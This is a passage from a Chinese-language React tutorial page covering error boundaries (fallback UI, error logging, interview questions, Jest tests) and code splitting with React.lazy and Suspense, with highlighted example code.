class="hljs-name">p</span>&gt;</span>我们的团队已收到通知，正在修复<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;()</span> =&gt;</span> window.location.reload()&#125;&gt;</span><br><span class="language-xml">            刷新页面</span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>      );<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">props</span>.<span class="hljs-property">children</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="错误边界最佳实践"><a href="#错误边界最佳实践" class="headerlink" title="错误边界最佳实践"></a>错误边界最佳实践</h3><p><strong>分层错误处理策略</strong></p><pre class="mermaid">graph LR    A[顶层边界] -->|捕获全局错误| B[应用崩溃页面]    C[模块边界] -->|捕获模块错误| D[模块降级UI]    E[组件边界] -->|捕获组件错误| F[组件占位符]    G[API边界] -->|捕获数据错误| H[空状态提示]</pre><p><strong>错误恢复策略比较</strong></p><table><thead><tr><th align="left">策略</th><th align="left">实现方式</th><th align="left">适用场景</th></tr></thead><tbody><tr><td align="left">页面刷新</td><td align="left">window.location.reload()</td><td align="left">全局状态不可恢复</td></tr><tr><td align="left">组件重置</td><td align="left">key 属性变化</td><td align="left">独立组件失败</td></tr><tr><td align="left">状态回滚</td><td align="left">恢复之前的状态快照</td><td align="left">表单操作失败</td></tr><tr><td align="left">备用数据</td><td align="left">显示缓存数据</td><td align="left">数据获取失败</td></tr></tbody></table><p><strong>错误日志规范</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">logErrorBoundary</span>(<span class="hljs-params">error, info</span>) &#123;<br>  <span class="hljs-keyword">const</span> logEntry = &#123;<br>    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>(),<br>    <span class="hljs-attr">message</span>: error.<span class="hljs-property">message</span>,<br>    <span class="hljs-attr">stack</span>: error.<span class="hljs-property">stack</span>,<br>    <span class="hljs-attr">componentStack</span>: info.<span class="hljs-property">componentStack</span>,<br>    <span class="hljs-attr">location</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>,<br>    <span class="hljs-attr">user</span>: currentUser ? currentUser.<span class="hljs-property">id</span> : <span class="hljs-string">&#x27;anonymous&#x27;</span>,<br>    <span class="hljs-attr">platform</span>: navigator.<span class="hljs-property">platform</span>,<br>    <span class="hljs-attr">environment</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">NODE_ENV</span>,<br>    <span class="hljs-attr">version</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">REACT_APP_VERSION</span><br>  &#125;;<br>  <br>  <span class="hljs-comment">// 发送到日志服务</span><br>  <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;/api/logs/errors&#x27;</span>, &#123;<br>    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>    <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span> &#125;,<br>    <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(logEntry)<br>  &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="面试高频问题解析"><a href="#面试高频问题解析" class="headerlink" title="面试高频问题解析"></a>面试高频问题解析</h3><p><strong>Q：错误边界可以捕获哪些类型的错误？</strong></p><ul><li>子组件渲染期间的错误</li><li>生命周期方法中的错误（包括渲染阶段）</li><li>构造函数中的错误</li><li>整个组件树的错误（包括异步代码中的错误？不行！）</li></ul><p>特别注意：</p><ul><li>事件处理程序中的错误不会被捕获</li><li>异步代码（setTimeout, Promise）错误不会被捕获</li><li>服务端渲染错误不会被捕获</li><li>错误边界自身抛出的错误不会被捕获</li></ul><p><strong>Q：为什么错误边界必须用类组件实现？</strong></p><ul><li>因为错误边界依赖 getDerivedStateFromError 和 componentDidCatch 生命周期方法</li><li>这两个方法目前只在类组件中可用</li><li>React 团队表示暂时没有计划在函数组件中添加类似能力</li></ul><p><strong>Q：如何在函数组件中实现类似错误边界的功能？</strong></p><ul><li>使用类组件包装：创建错误边界类组件包裹函数组件</li><li>自定义Hook：使用 useErrorBoundary Hook 手动捕获错误</li><li>第三方库：使用 react-error-boundary 库的 useErrorBoundary Hook</li><li>错误传播：在函数组件中抛出错误让父级错误边界捕获</li></ul><p><strong>Q：如何测试错误边界组件？</strong></p><p>测试策略：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用 Jest 和 React Testing Library</span><br><span class="hljs-title function_">test</span>(<span class="hljs-string">&#x27;捕获错误并显示降级UI&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-comment">// 创建抛出错误的组件</span><br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">ErrorComponent</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;测试错误&#x27;</span>);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">const</span> &#123; getByText &#125; = <span class="hljs-title function_">render</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">div</span>&gt;</span>错误捕获<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ErrorComponent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br>  );<br>  <br>  <span class="hljs-title function_">expect</span>(<span class="hljs-title function_">getByText</span>(<span class="hljs-string">&#x27;错误捕获&#x27;</span>)).<span class="hljs-title function_">toBeInTheDocument</span>();<br>&#125;);<br><br><span class="hljs-comment">// 测试错误日志</span><br><span class="hljs-title function_">test</span>(<span class="hljs-string">&#x27;记录错误到监控系统&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> mockErrorLogger = jest.<span class="hljs-title function_">fn</span>();<br>  <span class="hljs-keyword">const</span> error = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;测试错误&#x27;</span>);<br>  <br>  <span class="hljs-title function_">render</span>(<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ErrorBoundary</span> <span class="hljs-attr">onError</span>=<span class="hljs-string">&#123;mockErrorLogger&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ErrorComponent</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">ErrorBoundary</span>&gt;</span></span><br>  );<br>  <br>  <span class="hljs-title function_">expect</span>(mockErrorLogger).<span class="hljs-title function_">toHaveBeenCalledWith</span>(<br>    error,<br>    expect.<span class="hljs-title function_">objectContaining</span>(&#123;<br>      <span class="hljs-attr">componentStack</span>: expect.<span class="hljs-title function_">any</span>(<span class="hljs-title class_">String</span>)<br>    &#125;)<br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>核心功能：<ul><li>捕获子组件树中的渲染错误</li><li>展示降级UI替代崩溃界面</li><li>记录错误信息用于分析</li></ul></li><li>实现关键：<ul><li>getDerivedStateFromError 设置错误状态</li><li>componentDidCatch 记录错误信息</li><li>类组件专属实现</li></ul></li><li>最佳实践：<ul><li>分层错误边界策略</li><li>生产环境专用处理</li><li>与Suspense协同使用</li><li>完善的错误日志记录</li></ul></li><li>React 18 增强：<ul><li>与并发渲染兼容</li><li>与Suspense深度集成</li><li>更精细的错误处理控制</li></ul></li><li>面试重点：<ul><li>错误边界的捕获范围</li><li>类组件的必要性</li><li>函数组件的替代方案</li><li>测试策略与方法</li></ul></li></ul><h2 id="4-3-代码分割与懒加载（React-lazy-Suspense）"><a href="#4-3-代码分割与懒加载（React-lazy-Suspense）" class="headerlink" title="4.3 代码分割与懒加载（React.lazy + Suspense）"></a>4.3 代码分割与懒加载（React.lazy + Suspense）</h2><h3 id="代码分割核心概念"><a href="#代码分割核心概念" class="headerlink" title="代码分割核心概念"></a>代码分割核心概念</h3><p><strong>问题背景：传统打包痛点</strong></p><pre class="mermaid">graph TD    A[单入口打包] --> B[巨大的 bundle 文件]    B --> C[首屏加载缓慢]    B --> D[资源浪费]    B --> E[用户体验差]</pre><p><strong>代码分割核心价值</strong></p><table><thead><tr><th align="left">优化方向</th><th align="left">实现效果</th><th align="left">技术手段</th></tr></thead><tbody><tr><td align="left">首屏加载</td><td align="left">减少初始加载体积</td><td align="left">路由级分割</td></tr><tr><td align="left">按需加载</td><td align="left">使用时才加载资源</td><td align="left">组件级懒加载</td></tr><tr><td align="left">缓存优化</td><td align="left">更细粒度缓存控制</td><td align="left">模块分离</td></tr><tr><td align="left">并行加载</td><td align="left">利用浏览器并发能力</td><td align="left">多 chunk 并行</td></tr></tbody></table><h3 id="基础实现方案"><a href="#基础实现方案" class="headerlink" title="基础实现方案"></a>基础实现方案</h3><p><strong>Webpack 动态导入</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 动态导入语法</span><br><span class="hljs-keyword">import</span>(<span class="hljs-string">&quot;./math&quot;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">math</span> =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">16</span>, <span class="hljs-number">26</span>));<br>&#125;);<br><br><span class="hljs-comment">// React 组件动态导入</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProductModal</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ProductModal&#x27;</span>));<br></code></pre></td></tr></table></figure><p><strong>React.lazy 基础用法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">HomePage</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./pages/HomePage&#x27;</span>));<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">AboutPage</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./pages/AboutPage&#x27;</span>));<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ContactPage</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./pages/ContactPage&#x27;</span>));<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        &lt;<span class="hljs-attr">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">HomePage</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">      &#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/about&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        &lt;<span class="hljs-attr">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">AboutPage</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">      &#125; /&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/contact&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">        &lt;<span class="hljs-attr">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">Spinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">ContactPage</span> /&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">      &#125; /&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Suspense 核心机制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserDashboard</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">UserProfile</span> /&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">CardSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">RecentActivities</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ChartPlaceholder</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">PerformanceChart</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// 嵌套 Suspense 示例</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">FullPageSpinner</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ContentLoader</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">Router</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">              &#123;/* 路由配置 */&#125;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">Routes</span>&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Router</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;null&#125;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">LiveChatWidget</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="高级优化策略"><a href="#高级优化策略" class="headerlink" title="高级优化策略"></a>高级优化策略</h3><p><strong>路由级代码分割</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 路由配置文件</span><br><span class="hljs-keyword">const</span> routes = [<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>,<br>    <span class="hljs-attr">element</span>: (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">PageLoader</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">HomePage</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>    )<br>  &#125;,<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/dashboard&#x27;</span>,<br>    <span class="hljs-attr">element</span>: (<br>      <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">DashboardSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">DashboardLayout</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>    ),<br>    <span class="hljs-attr">children</span>: [<br>      &#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;analytics&#x27;</span>,<br>        <span class="hljs-attr">element</span>: (<br>          <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ChartLoader</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">AnalyticsPage</span> /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>        )<br>      &#125;,<br>      &#123;<br>        <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;settings&#x27;</span>,<br>        <span class="hljs-attr">element</span>: (<br>          <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">SettingsPlaceholder</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">SettingsPage</span> /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br>        )<br>      &#125;<br>    ]<br>  &#125;<br>];<br></code></pre></td></tr></table></figure><p><strong>组件级懒加载</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProductGallery</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ProductGallery&#x27;</span>));<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">ProductReviews</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./ProductReviews&#x27;</span>));<br><span class="hljs-keyword">const</span> <span class="hljs-title class_">RelatedProducts</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">lazy</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./RelatedProducts&#x27;</span>));<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductDetailPage</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> [activeTab, setActiveTab] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">&#x27;gallery&#x27;</span>);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      &#123;/* 标签切换 */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Tabs</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">&#123;setActiveTab&#125;</span> /&gt;</span></span><br><span class="language-xml">      </span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;tab-content&quot;</span>&gt;</span></span><br><span class="language-xml">        &#123;activeTab === &#x27;gallery&#x27; &amp;&amp; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ImageGridSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">ProductGallery</span> /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">        )&#125;</span><br><span class="language-xml">        </span><br><span class="language-xml">        &#123;activeTab === &#x27;reviews&#x27; &amp;&amp; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ReviewListSkeleton</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">ProductReviews</span> /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">        )&#125;</span><br><span class="language-xml">        </span><br><span class="language-xml">        &#123;activeTab === &#x27;related&#x27; &amp;&amp; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">Suspense</span> <span class="hljs-attr">fallback</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ProductCardSkeleton</span> <span class="hljs-attr">count</span>=<span class="hljs-string">&#123;3&#125;</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">RelatedProducts</span> /&gt;</span></span><br><span class="language-xml">          <span class="hljs-tag">&lt;/<span class="hljs-name">Suspense</span>&gt;</span></span><br><span class="language-xml">        )&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>预加载优化</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 